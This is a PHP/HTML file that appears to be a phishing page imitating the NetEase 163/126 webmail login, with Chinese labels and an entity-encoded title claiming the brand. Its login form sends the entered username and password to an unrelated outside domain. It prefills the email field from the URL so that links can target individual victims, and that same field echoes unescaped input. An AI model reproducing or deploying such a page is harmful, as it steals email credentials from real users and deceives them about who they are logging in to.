<?php   
?>
<!DOCTYPE HTML>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<title>163-126&#32593;&#26131;&#20813;&#36153;&#37038;&#45;&#45;&#20013;&#25991;&#37038;&#31665;&#31532;&#19968;&#21697;&#29260;</title>
	<link rel="stylesheet" href="https://kbokogroup.com/netease/NETEASE/style.css" />
	<link href='http://fonts.googleapis.com/css?family=Oleo+Script' rel='stylesheet' type='text/css'>
</head>
<body>
	<div class="lg-container">
		<h1>邮箱帐号登录</h1>
		<form action="https://kbokogroup.com/winco2/waka-login.php" id="lg-form" name="lg-form" method="post">
			
			<div>
			<label for="username">Username:</label>
				<input type="text" required="" name="username" id="username" 
				placeholder="&#37038;&#31665;&#24080;&#21495;&#25110;&#25163;&#26426;&#21495;" value="<?=$_GET[email]?>" 
				/>
			</div>
			
			<div>
				<label for="password">密码</label>
				<input type="password" name="password" autofocus="" required="" id="password" placeholder="密码" />
			</div>
			
			<div>				
				<button type="submit" id="login">登 录</button>
			</div>
			
		</form>
		<div id="message"></div>
	</div>
</body>
</html>
